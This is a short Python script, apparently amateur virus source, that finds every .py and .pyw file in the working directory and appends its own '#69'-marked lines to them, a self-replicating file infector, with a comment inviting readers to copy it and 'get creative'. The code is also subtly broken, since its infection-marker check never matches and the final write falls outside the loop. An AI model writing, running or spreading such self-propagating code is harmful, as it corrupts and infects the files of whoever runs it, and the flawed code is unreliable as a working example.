import os #69 #Copy anything with #69 to python can get creative with this
import socket #69
import subprocess #69
import time #69
import signal #69
import sys #69
import struct #69
import glob #69
from string import * #69
Files = glob.glob("*.py") + glob.glob("*.pyw") #69
for Files in Files: #69
   vCode = open(__file__, 'r') #69
   victim = open (Files, 'r') #69
   readvictim = victim.read() #69
   if find(readvictim, "~Zveu~") == -1: #69
       victim = open(Files, 'a') #69
       for code in vCode.readlines(): #69
            if ("#69") in code: #69
                vCode.close() #69
                mycode=(chr(10)+code) #69
victim.write(mycode) #69
